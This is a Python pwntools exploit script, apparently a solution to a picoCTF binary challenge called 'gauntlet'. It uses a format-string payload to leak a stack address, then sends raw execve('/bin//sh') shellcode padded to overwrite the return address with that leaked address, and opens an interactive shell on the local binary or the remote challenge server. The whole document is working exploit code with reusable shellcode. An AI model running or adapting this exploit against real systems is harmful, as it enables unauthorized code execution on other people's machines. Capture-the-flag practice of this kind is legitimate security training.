#!/usr/bin/python3

from pwn import *
import sys

context.arch = 'amd64'

#BIN = './gauntlet'
BIN = './G'

if len(sys.argv) > 1:
    r = remote('mercury.picoctf.net', 33542)
else:
    r = process(BIN, env={"LD_PRELOAD": "./libc.so.6"})

s = ""
for i in range(6, 15):
    s += f'%{i}$p - '

r.sendline(s)
owo = r.recvline().split(b' - ')
print(owo)

ret_off = 0x78
stack = int(owo[6], 16) - 0x10 - ret_off

info(f"""
stack = {hex(stack)}
""")

payload = b'H1\xc0H1\xd2H1\xf6H1\xff\xbf\xaa\x80\x12`\xc1\xef\x08H\xbb/bin//shH\x89\x1f\xb0;\x0f\x05'.ljust(ret_off, b'\xAA') + p64(stack)
input()
r.sendline(payload)

r.interactive()
